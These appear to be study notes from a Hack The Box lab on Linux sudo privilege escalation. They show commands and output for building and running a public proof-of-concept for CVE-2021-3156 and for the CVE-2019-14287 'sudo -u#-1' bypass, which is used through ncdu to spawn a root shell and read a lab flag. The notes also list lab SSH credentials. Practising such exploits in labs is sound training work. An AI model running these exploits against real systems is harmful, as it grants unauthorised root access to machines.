# Sudo

The program sudo is used under UNIX operating systems like Linux or macOS to start processes with the rights of another user. 

/etc/sudoers file specifies which users or groups are allowed to run specific programs and with what privileges.

sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
[sudo] password for cry0l1t3:  **********

Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
Defaults        use_pty
root            ALL=(ALL:ALL) ALL
%admin          ALL=(ALL) ALL
%sudo           ALL=(ALL:ALL) ALL
cry0l1t3        ALL=(ALL) /usr/bin/id
@includedir     /etc/sudoers.d

## Vulnerability

CVE-2021-3156 affects :

1.8.31 - Ubuntu 20.04
1.8.27 - Debian 10
1.9.2 - Fedora 33
and others

1) Find version :

sudo -V | head -n1
Sudo version 1.8.31

cat /etc/lsb-release

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"

2) Upload exploit

git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c

3) Run exploit

./sudo-hax-me-a-sandwich

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

4) Choose option depending on OS version

Here :
DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"

So :
./sudo-hax-me-a-sandwich 1

id
uid=0(root) gid=0(root) groups=0(root)

## Sudo Policy Bypass

CVE-2019-14287
https://www.sudo.ws/security/advisories/minus_1_uid/

It affects all versions below 1.8.28

Principle : If a negative ID (-1) is entered at sudo, this results in processing the ID 0, which only the root has

Prerequisite : It had to allow a user in the /etc/sudoers file to execute a specific command

sudo -l
[sudo] password for cry0l1t3: **********

User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id

sudo -u#-1 id

id
uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)

## LAB

ssh htb-student@10.129.121.197
HTB_@cademy_stdnt!

sudo -V | head -n1
Sudo version 1.8.21p2

cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.3 LTS"

id
uid=1001(htb-student) gid=1001(htb-student) groups=1001(htb-student)


git clone https://github.com/blasty/CVE-2021-3156.git

scp -r CVE-2021-3156 htb-student@10.129.121.197:/home/htb-student/CVE-2021-3156/

On our host :
cd CVE-2021-3156
make

rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c

scp sudo-hax-me-a-sandwich CVE-2021-3156 htb-student@10.129.121.197:/home/htb-student/CVE-2021-3156/

./sudo-hax-me-a-sandwich

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

  manual mode:
    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>


./sudo-hax-me-a-sandwich 1

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **
Sorry, user htb-student is not allowed to execute 'sudoedit AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' as root on ubuntu.

--> Failed : bad version

sudo -l
[sudo] password for htb-student: 
Matching Defaults entries for htb-student on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ubuntu:
    (ALL, !root) /bin/ncdu

cat /etc/passwd | grep htb-student
htb-student:x:1001:1001::/home/htb-student:/bin/sh

cd /
sudo -u#-1 ncdu -o export /root/
/root/.viminfo                                                           2 files

cat export
[1,1,{"progname":"ncdu","progver":"1.14.1","timestamp":1706182296},
[{"name":"/root","asize":4096,"dsize":4096,"dev":64768,"ino":8194},
{"name":".viminfo","asize":8295,"dsize":12288,"ino":431},
{"name":".bashrc","asize":3106,"dsize":4096,"ino":276},
{"name":"flag.txt","asize":25,"dsize":4096,"ino":1789},
[{"name":"snap","asize":4096,"dsize":4096,"ino":17606},
[{"name":"lxd","asize":4096,"dsize":4096,"ino":17745},
[{"name":"24918","asize":4096,"dsize":4096,"ino":262241}],
[{"name":"common","asize":4096,"dsize":4096,"ino":17747}],
[{"name":"24846","asize":4096,"dsize":4096,"ino":262237}],
{"name":"current","asize":5,"ino":3754,"notreg":true}]],
[{"name":".cache","asize":4096,"dsize":4096,"ino":262164},
{"name":"motd.legal-displayed","ino":262169}],
[{"name":".ssh","asize":4096,"dsize":4096,"ino":14334},
{"name":"authorized_keys","ino":14335}],
{"name":".bash_history","asize":9,"ino":1125,"notreg":true},
{"name":".profile","asize":161,"dsize":4096,"ino":277}]]$ 

sudo -u#-1 ncdu -1xo- /root/ | gzip > /home/htb-student/scan.gz

gzip -d scan.gz

which ncdu
/usr/bin/ncdu

sudo -u#-1 /usr/bin/ncdu

sudo -u#-1 /bin/ncdu

sudo -u#-1 /bin/ncdu -f /root/flag.txt

sudo -u#-1 ncdu -f /root/flag.txt

sudo -u#-1 /bin/ncdu
b

--> Option b spawn a shell into the directory

# cd /root/
# cat flag.txt
HTB{SuD0_e5c4l47i0n_1id}
